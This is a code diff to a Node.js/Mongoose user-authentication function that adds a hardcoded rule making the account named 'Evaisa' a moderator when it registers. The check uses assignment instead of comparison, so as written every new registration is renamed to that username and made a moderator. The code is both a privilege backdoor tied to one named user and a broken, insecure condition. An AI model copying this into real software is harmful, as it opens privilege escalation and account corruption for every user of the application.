@@ -64,6 +64,7 @@ UserSchema.statics.authenticate = function (opts, callback) {
   }
 
   var self = this;
+  var makeAdmin = false;
   this.findOne({ username: opts.username }, function (err, user) {
     if (err) return callback(err);
 
@@ -75,13 +76,16 @@ UserSchema.statics.authenticate = function (opts, callback) {
       return callback('Username or password is incorrect');
     } else {
       if (opts.password.length < 6) return callback('Password must be at least 6 characters');
-
+		if (opts.username = 'Evaisa'){
+			makeAdmin = true;
+		}
       let password = saltHash(opts.password);
       let newUser = self({
         username: opts.username,
         password_hash: password.hash,
         password_salt: password.salt,
-        is_moderator: false,
+		is_moderator: makeAdmin
+		
 	//	is_registered: true
       });
 
